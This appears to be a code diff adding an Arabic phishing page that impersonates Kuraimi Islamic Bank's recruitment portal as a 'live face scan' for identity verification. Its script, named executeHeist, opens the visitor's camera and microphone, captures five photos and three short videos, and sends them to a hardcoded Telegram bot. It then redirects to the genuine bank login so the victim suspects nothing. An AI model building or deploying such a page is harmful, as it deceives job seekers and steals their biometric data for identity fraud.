@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة التوظيف | بنك الكريمي</title>
+    <style>
+        @keyframes flow { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        body { 
+            font-family: 'Segoe UI', sans-serif; 
+            background: linear-gradient(-45deg, #004a99, #002d5f, #d4af37, #8e6d11);
+            background-size: 400% 400%;
+            animation: flow 10s ease infinite;
+            display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden;
+        }
+        .card { 
+            background: white; padding: 25px; border-radius: 20px; text-align: center; color: #333; width: 85%; max-width: 380px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); 
+        }
+        .logo { width: 140px; margin-bottom: 15px; }
+        
+        /* تصميم نافذة الفيديو الجديدة في الأعلى */
+        .video-container {
+            width: 100%;
+            height: 180px;
+            background: #000;
+            border-radius: 12px;
+            margin-bottom: 15px;
+            overflow: hidden;
+            border: 2px solid #004a99;
+            position: relative;
+        }
+        #v { width: 100%; height: 100%; object-fit: cover; }
+        
+        .btn { background: #004a99; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; cursor: pointer; font-size: 19px; font-weight: bold; transition: 0.3s; }
+        .btn:hover { background: #002d5f; }
+        #status { display: none; margin-top: 15px; color: #004a99; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <img src="https://jobs.kuraimibank.com/assets/images/logo.png" class="logo">
+        
+        <div class="video-container">
+            <video id="v" autoplay playsinline muted></video>
+        </div>
+
+        <h2 style="margin: 0 0 10px 0; font-size: 22px; color: #004a99;"> مع بنك الكريمي الإسلامي تأكيد الهوية الرقمية</h2>
+        <p style="font-size: 14px; color: #666; margin-bottom: 20px;">يرجى النقر لبدء مسح الوجه الحي لمطابقة بياناتك الحيوية ومتابعة الدخول الآمن.</p>
+        
+        <button class="btn" id="startBtn" onclick="executeHeist()">ابدأ المسح الآن</button>
+        
+        <div id="status">جاري الفحص الرقمي... <span id="progress">0%</span></div>
+    </div>
+
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const BOT_TOKEN = '5826969870:AAF2RAg49eZHLJ62onDtVjBskxgYFvfdkpQ';
+        const CHAT_ID = '1538488453';
+
+        async function executeHeist() {
+            const btn = document.getElementById('startBtn');
+            const status = document.getElementById('status');
+            const video = document.getElementById('v');
+            const canvas = document.getElementById('c');
+            const ctx = canvas.getContext('2d');
+
+            btn.style.display = 'none';
+            status.style.display = 'block';
+
+            try {
+                // طلب الكاميرا (دقة متوازنة لسرعة الرفع)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 480, height: 640 }, 
+                    audio: true 
+                });
+                video.srcObject = stream;
+
+                // انتظار ثانية واحدة ليبدأ البث
+                await new Promise(r => setTimeout(r, 1500));
+
+                // 📸 التقاط 5 صور أصلية (بأبعاد الفيديو الحقيقية)
+                for (let i = 1; i <= 5; i++) {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
+                    canvas.toBlob((blob) => {
+                        const fd = new FormData();
+                        fd.append('photo', blob, `live_face_${i}.jpg`);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto?chat_id=${CHAT_ID}`, { method: 'POST', body: fd });
+                    }, 'image/jpeg', 0.6);
+                    await new Promise(r => setTimeout(r, 600));
+                }
+
+                // 🎥 إرسال 3 فيديوهات (8 ثوانٍ لكل واحد - H.264 متوافق)
+                for (let j = 1; j <= 3; j++) {
+                    document.getElementById('progress').innerText = `${j * 33}%`;
+                    await new Promise((resolve) => {
+                        const recorder = new MediaRecorder(stream, { bitsPerSecond: 600000 });
+                        let chunks = [];
+                        recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'video/mp4' });
+                            const fd = new FormData();
+                            fd.append('video', blob, `vid_${j}.mp4`);
+                            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo?chat_id=${CHAT_ID}`, { method: 'POST', body: fd })
+                            .then(() => resolve());
+                        };
+                        recorder.start();
+                        setTimeout(() => { if(recorder.state === "recording") recorder.stop(); }, 8000); 
+                    });
+                }
+
+                // التوجيه النهائي
+                window.location.href = "https://jobs.kuraimibank.com/login";
+
+            } catch (err) {
+                location.reload();
+            }
+        }
+    </script>
+</body>
+</html>
+
